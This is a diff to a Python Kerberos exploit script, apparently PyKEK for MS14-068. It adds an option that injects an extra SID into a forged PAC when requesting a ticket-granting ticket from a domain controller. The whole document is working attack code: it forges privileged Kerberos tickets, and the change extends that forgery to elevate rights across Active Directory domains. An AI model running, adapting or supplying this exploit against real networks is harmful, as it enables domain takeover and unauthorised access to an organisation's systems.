@@ -24,8 +24,7 @@ from kek.util import epoch2gt, gt2epoch
 
 
 def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,
-           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None):
-
+           output_filename, extrasid, krbtgt_a_key=None, trust_ab_key=None, target_key=None):
     sys.stderr.write('  [+] Building AS-REQ for %s...' % kdc_a)
     sys.stderr.flush()
     nonce = getrandbits(31)
@@ -62,7 +61,7 @@ def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm
     subkey = generate_subkey()
     nonce = getrandbits(31)
     current_time = time()
-    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
+    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time, extrasid))
     tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name,
                             tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
     sys.stderr.write(' Done!\n')
@@ -159,10 +158,11 @@ if __name__ == '__main__':
         print >> sys.stderr, ''
         print >> sys.stderr, 'OPTIONS:'
         print >> sys.stderr, '    -p <clearPassword>'
+        print >> sys.stderr, '    -e <extraSid domain>'
         print >> sys.stderr, ' --rc4 <ntlmHash>'
         sys.exit(1)
 
-    opts, args = getopt(sys.argv[1:], 'u:s:d:p:', ['rc4='])
+    opts, args = getopt(sys.argv[1:], 'u:s:d:p:e:', ['rc4='])
     opts = dict(opts)
     if not all(k in opts for k in ('-u', '-s', '-d')):
         usage_and_exit()
@@ -170,6 +170,7 @@ if __name__ == '__main__':
     user_name, user_realm = opts['-u'].split('@', 1)
     user_sid = opts['-s']
     kdc_a = opts['-d']
+    extrasid = None
 
     if '--rc4' in opts:
         user_key = (RC4_HMAC, opts['--rc4'].decode('hex'))
@@ -179,6 +180,9 @@ if __name__ == '__main__':
     else:
         user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest())
 
+    if '-e' in opts:
+        extrasid = opts['-e']
+
     target_realm = user_realm
     target_service = target_host = kdc_b = None
     filename = 'TGT_%s@%s.ccache' % (user_name, user_realm)
@@ -186,4 +190,4 @@ if __name__ == '__main__':
     user_realm = user_realm.upper()
     target_realm = target_realm.upper()
 
-    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)
+    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename, extrasid)
